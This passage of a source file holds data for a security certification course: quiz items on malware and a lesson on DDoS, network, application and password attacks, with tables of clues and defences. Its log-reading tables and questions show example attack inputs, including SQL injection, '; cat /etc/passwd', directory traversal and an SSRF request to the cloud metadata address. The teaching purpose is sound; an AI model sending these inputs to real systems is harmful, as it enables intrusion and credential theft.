      'A rootkit', ['Fileless malware', 'Spyware', 'Bloatware'],
      'A rootkit gains kernel-level control and hides from the operating system, so tools running on the system are deceived. An offline scan sees the real disk.'),
    mcq('A process started by Word runs an encoded PowerShell command. Nothing new is written to disk and signature-based antivirus finds nothing. What is it?',
      'Fileless malware', ['A rootkit', 'A logic bomb', 'A worm'],
      'Fileless malware runs in memory using built-in tools such as PowerShell, so there is no file for signatures to match. The PowerShell process itself is visible, so nothing is being hidden as a rootkit would.'),
  ],
};

export const ATTACKS: LessonBody = {
  goals: [
    'Tell a botnet DDoS from a reflected, amplified one, and say how each is stopped',
    'Identify DNS, wireless, on-path and credential replay attacks from their clues',
    'Read web logs for SQL and command injection, traversal, overflows, XSS, CSRF, SSRF, replay and privilege escalation',
    'Name the physical, cryptographic and password attacks in objective 2.4',
  ],
  blocks: [
    recap('Topic 14 named the malware. This topic covers the attacks on networks and applications. Lesson 8 explained DNS and ARP and Lesson 9 explained Wi-Fi, so here you see how each is abused. As before, every attack has a look-alike, and one clue tells them apart.'),
    words(
      ['Denial of service (DoS)', 'Making a system unavailable by exhausting what it needs, such as bandwidth or connections'],
      ['Botnet', 'Many infected machines controlled together, often used for DDoS or spam'],
      ['Spoofing', 'Forging a source address or identity so traffic seems to come from someone else'],
      ['Open resolver', 'A DNS server that answers anyone on the internet, which attackers use to reflect traffic'],
      ['On-path attack', 'An attacker placed between two parties, able to read or change what passes between them'],
      ['Injection', 'Input crafted so a program treats it as instructions, such as SQL or shell commands'],
      ['Session cookie', 'The token a browser sends to show it is already signed in'],
    ),

    h('Denial of service: botnets, reflection and amplification', { objective: '2.4', keep: 'DDoS uses many machines to exhaust a target. Reflected: spoofed requests make third-party servers send replies to the victim. Amplified: the replies are much larger than the requests (DNS, NTP, memcached). Defend upstream: scrubbing services, rate limits, closed resolvers.' }),
    p('A **denial of service** (DoS) attack makes a system unavailable by exhausting something it needs: bandwidth, connections, memory or CPU. A **distributed** DoS (DDoS) uses many machines at once, usually a **botnet**, so blocking one source does nothing. Two techniques make DDoS attacks far bigger:'),
    table(
      ['Kind', 'How it works', 'What the victim sees'],
      [
        ['Direct (botnet flood)', 'Each bot sends its own traffic at the victim: SYN floods, HTTP request floods', 'Huge numbers of requests from thousands of real addresses'],
        ['Reflected', 'The attacker sends requests to innocent servers with the **victim\'s address forged** as the source; the replies go to the victim', 'Replies from legitimate servers to requests it never made'],
        ['Amplified', 'A reflected attack using requests whose replies are **much bigger**: DNS (about 50x), NTP (over 500x), memcached (thousands of times)', 'A flood far larger than the attacker\'s own bandwidth'],
      ],
      { caption: 'Three ways to deny service' },
    ),
    {
      type: 'sequence',
      title: 'A DNS amplification attack',
      steps: [
        { from: 'Botnet', to: 'Open DNS resolvers', label: 'Query, 60 bytes, source = victim', note: 'Each bot sends small DNS queries to thousands of **open resolvers**, servers that answer anyone. The source address is **spoofed**: it is the victim\'s, not the bot\'s.' },
        { from: 'Open DNS resolvers', to: 'Victim', label: 'Answer, 3,000 bytes', note: 'The resolvers do their job and reply to the address in the packet, the victim. The query asked for a large record, so each answer is about **50 times** the size of the question. This is **reflection** plus **amplification**.' },
        { from: 'Open DNS resolvers', to: 'Victim', label: '60 Gbps of answers', note: 'Thousands of resolvers reply at once. The victim\'s internet link fills up, and real customers cannot get through. Blocking the resolvers is hard: they are ordinary, legitimate servers.' },
        { from: 'Victim', to: 'Scrubbing service', label: 'Traffic rerouted', note: 'The defence: send traffic through an upstream **DDoS scrubbing** service or CDN that can absorb it, filter out the junk and pass on real requests. Rate limiting helps, and ISPs filtering spoofed source addresses stops reflection at the start.' },
      ],
    },
    tip('Reflection hides the attacker, and amplification multiplies their bandwidth. Most large attacks use both, which is why the exam groups them together. A volume attack is also hard to stop at your own firewall: by then your link is already full.'),

    h('Network attacks: DNS, wireless, on-path and replay', { objective: '2.4', keep: 'DNS poisoning gives the wrong address for a name; ARP poisoning makes you the gateway. Evil twin copies a network\'s name; rogue AP is any unauthorized AP. Deauth forges disconnect frames; jamming is radio noise. Pass-the-hash replays a stolen hash.' }),
    table(
      ['Attack', 'What happens', 'Tell it apart by', 'Defence'],
      [
        ['DNS poisoning', 'Forged records make a resolver give the attacker\'s address for a real name', 'The right name, the wrong IP', 'DNSSEC, trusted resolvers'],
        ['Domain hijacking', 'The attacker takes over the domain\'s registration and changes its records everywhere', 'The registrar records changed', 'Registrar lock, MFA on the registrar account'],
        ['Evil twin', 'A fake access point copies a real network\'s name to lure users', 'Two networks with the same name', 'WPA3 Enterprise, certificate checks, VPN'],
        ['Rogue access point', 'An unauthorized AP connected to your network, malicious or not', 'An unknown AP plugged into your LAN', 'Wireless surveys, 802.1X on switch ports'],
        ['Deauthentication', 'Forged management frames knock clients off the Wi-Fi', 'A flood of deauth frames; clean radio', 'Protected management frames (802.11w, WPA3)'],
        ['Wireless jamming', 'Radio noise drowns out all signals', 'Noise on the band, no frames', 'Find the source; wired backup'],
        ['On-path (ARP poisoning)', 'Forged ARP replies make the attacker the gateway, so traffic passes through them', 'Gateway IP maps to the wrong MAC', 'Dynamic ARP inspection, TLS everywhere'],
        ['Credential replay (pass-the-hash)', 'A captured hash or token is reused to sign in without the password', 'Sign-ins with no failed attempts, from odd hosts', 'Disable NTLM where possible, Kerberos, Credential Guard, limit admin sign-ins'],
      ],
      { caption: 'The network attacks in objective 2.4' },
    ),
    trap('**Evil twin or rogue AP?** Every evil twin is a rogue AP in the broad sense, but the exam uses "evil twin" when a real network\'s **name is copied** to trick users, and "rogue" when an unauthorized AP is simply **on your network**, often put there by an employee.'),

    h('Try it: name the network attack', { objective: '2.4', keep: 'Traffic from bots: botnet DDoS. Replies to queries never sent: amplified. Same SSID twice: evil twin. AP in a LAN jack: rogue. Forged deauth frames: deauthentication. Noise, no frames: jamming. Wrong MAC for the gateway: ARP. Wrong IP for a name: DNS.' }),
    cases('Name the network attack', NETWORK_OPTIONS, NETWORK_CASES, { icon: 'lan', intro: 'Network attacks come in look-alike pairs. Each case has one clue that only the right answer explains.' }),

    h('Application attacks: read the log', { objective: '2.4', keep: 'Quotes and OR 1=1: SQL injection. A semicolon and a shell command: command injection. ../ in a path: traversal. Thousands of characters then a crash: buffer overflow. Script in stored content: XSS. Another site sends your request: CSRF. The server fetches an internal URL: SSRF.' }),
    p('Application attacks abuse the way a program handles input. Most of them leave a recognisable mark in web server or application logs, which is exactly how the exam shows them.'),
    table(
      ['Attack', 'What the input looks like', 'What it does', 'Defence'],
      [
        ['SQL injection (SQLi)', '`\' OR \'1\'=\'1\' --`', 'Changes the database query: read, change or delete data', 'Parameterized queries, input validation'],
        ['Command injection', '`; cat /etc/passwd` or `&& whoami`', 'Runs operating system commands on the server', 'Avoid shell calls, allow-list input'],
        ['Memory injection', 'Code written into another running process', 'Runs malicious code inside a trusted process', 'EDR, memory protections'],
        ['Directory traversal', '`../../../etc/passwd`, or `%2e%2e%2f`', 'Reads files outside the web folder', 'Canonicalize paths, run with least privilege'],
        ['Buffer overflow', 'Thousands of characters, then machine code', 'Overwrites memory, crashes or runs code', 'Bounds checking, ASLR, DEP'],
        ['Cross-site scripting (XSS)', '`<script>` in a comment or a link', 'Attacker script runs in other users\' browsers', 'Output encoding, input validation, CSP'],
        ['Cross-site request forgery (CSRF)', 'A hidden request on another site to `bank.example/transfer`', 'The victim\'s browser sends a request the site trusts', 'Anti-CSRF tokens, SameSite cookies'],
        ['Server-side request forgery (SSRF)', '`url=http://169.254.169.254/...`', 'The server fetches internal resources for the attacker', 'Allow-list destinations, block metadata access'],
        ['Replay', 'An identical, previously valid request sent again', 'Repeats a payment or a sign-in', 'Nonces, timestamps, short-lived tokens, TLS'],
        ['Privilege escalation', 'A request for more rights, or an exploit of a flaw', 'Vertical: higher rights. Horizontal: another user\'s data', 'Check authorization on every request, patch'],
      ],
      { caption: 'Application attacks and how they look in the logs' },
    ),
    trap('**CSRF or SSRF?** In CSRF the **user\'s browser** is tricked into sending a request to a site that trusts it. In SSRF the **server** is tricked into making a request, usually to something internal. **XSS or CSRF?** XSS runs attacker script on the trusted site; CSRF runs none there.'),

    h('Try it: read the web server log', { objective: '2.4', keep: 'Read the input, not the outcome: the characters an attacker sends usually name the attack. Quotes for SQL, semicolons for commands, ../ for traversal, long strings for overflows, script tags for XSS, internal URLs for SSRF.' }),
    cases('Read the log', APP_OPTIONS, APP_CASES, { icon: 'terminal', intro: 'Each case is a few log lines or messages. Look at what the attacker sent: the characters in the input usually name the attack.' }),

    h('Physical, cryptographic and password attacks', { objective: '2.4', keep: 'Physical: brute force (forcing a door), RFID cloning, environmental (HVAC, power). Crypto: downgrade forces weak protocols; collision and birthday find two inputs with one hash. Spraying tries one password on many accounts; brute force tries many on one.' }),
    table(
      ['Attack', 'What it is', 'Tell it apart by'],
      [
        ['Brute force (physical)', 'Forcing a way in: breaking a lock, a door or a window', 'Physical damage; stopped by stronger barriers and bollards'],
        ['RFID cloning', 'Reading a badge from nearby and copying it to a blank card', 'A badge used in two places, or at odd hours'],
        ['Environmental', 'Attacking the conditions systems need: HVAC, power, fire suppression', 'Overheating or outages with no network attack'],
        ['Downgrade', 'Forcing a connection to use an older, weaker protocol or cipher (as in SSL stripping)', 'TLS 1.0 or HTTP where TLS 1.3 was expected'],
        ['Collision', 'Finding two different inputs with the same hash, to forge a signed file', 'Targets weak hashes such as MD5 and SHA-1'],
        ['Birthday', 'Uses probability to find a collision far faster than trying every value', 'Why hash length matters: longer hashes resist it'],
        ['Password spraying', 'A few common passwords tried against **many accounts**, slowly', 'Failures spread over many users; avoids lockouts'],
        ['Brute force (password)', 'Many passwords tried against **one account**', 'Lots of failures on one user, then lockout'],
      ],
      { caption: 'More attacks in objective 2.4' },
    ),
    tip('Topic 11 lets you set a lockout policy and watch which password attacks it stops, and Topic 3 shows why short hashes are vulnerable to collisions.'),

  ],
  check: [
    mcq('A web server receives large DNS responses from thousands of resolvers, answering queries it never sent. What kind of attack is this?',
      'A reflected, amplified DDoS', ['DNS poisoning', 'An on-path attack', 'A botnet SYN flood'],
      'Spoofed queries made innocent resolvers reply to the victim (reflection), with replies far larger than the queries (amplification).'),
    mcq('A log shows `GET /file?name=../../../etc/passwd`. Which attack is being attempted?',
      'Directory traversal', ['SQL injection', 'Command injection', 'Server-side request forgery'],
      'Each `../` climbs up a folder, out of the web directory, to read files the site should never serve.'),
    mcq('A laptop shows two Wi-Fi networks with the café\'s name, and the stronger one asks for company credentials on a sign-in page. What is this?',
      'An evil twin', ['A rogue access point plugged into the LAN', 'A deauthentication attack', 'Wireless jamming'],
      'An evil twin copies a real network\'s name to lure users. A rogue AP is an unauthorized AP on your own network, usually without copying any name.'),
    mcq('A link preview feature is given `http://169.254.169.254/latest/meta-data/` and returns the cloud server\'s access keys. Which attack is this?',
      'Server-side request forgery', ['Cross-site request forgery', 'Cross-site scripting', 'Directory traversal'],
      'The server was tricked into fetching an internal address for the attacker. In CSRF it is the user\'s browser that sends the forged request.'),
  ],
};
